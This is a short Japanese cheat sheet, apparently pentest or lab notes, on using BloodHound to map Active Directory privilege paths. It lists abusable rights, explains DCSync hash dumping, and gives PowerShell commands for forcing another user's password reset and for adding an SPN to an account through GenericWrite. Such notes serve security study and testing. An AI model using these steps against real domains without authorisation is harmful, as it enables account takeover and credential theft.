# bloodhoundとは
Active Directory内の複雑な権限関係を可視化し、管理者権限までの最短ルートを見つけ出すツール。

## コマンド
```bash
bloodhound-python -d <ドメイン> -u <ユーザー名> -p <パスワード> -ns <ターゲット> -c All # 認証済みユーザーを使用してjsonファイルを生成。このファイルをブラウザ経由でGUIにアップロードする。
bloodhound # 起動 localhost:8080
```

## 特権
`WriteDACL` ACLの変更権限  
`ReadGMSAPassword` GMSAアカウントのパスワードの読み取り権限  
`AllowedToDelegate` DCにアクセスするユーザーのためのサービスチケットの要求権限  
`GenericAll` パスワードを含むすべての属性の変更権限  
`ForceChangePassword` 以前のパスワードを知らずにパスワードを変更できる権限  
`GenericWrite` SPNを含む属性変更権限  
`GetChanges` 属性読み取り権限  
`GetChangesAll` すべての属性読み取り権限  
`GetChangesInFilteredSet` フィルタリングされている属性読み取り権限

## DCSync攻撃
ADのレプリケーション（サーバー同士のデータの同期）を悪用し、全ユーザーのパスワードハッシュを取得する攻撃  
`GetChanges`,`GetChangesAll`の二つの権限がある場合に有効な可能性が高い。

## GenericAll, ForceChangePasswordを使用したパスワード変更
```powershell
$SecurePass = ConvertTo-SecureString "<任意のパスワード>" -AsPlain -Force
Set-ADAccountPassword -Identity "<ユーザー名>" -NewPassword $SecurePass -Reset
```

## GenericWriteを使用したSPN付与
```powershell
$pass = convertto-securestring "pass123" -Asplain -Force
$cred = new-object system.management.automation.pscredential ("<ドメイン>\<GenericWrite権限のあるユーザー>", $pass)
Set-ADUser -Identity <SPNを付与するユーザー> -ServicePrincipalNames @{Add="<HTTP>/<なんでも>"} # webサーバーに紐づくサービスアカウントにするためのSPNの付与
```
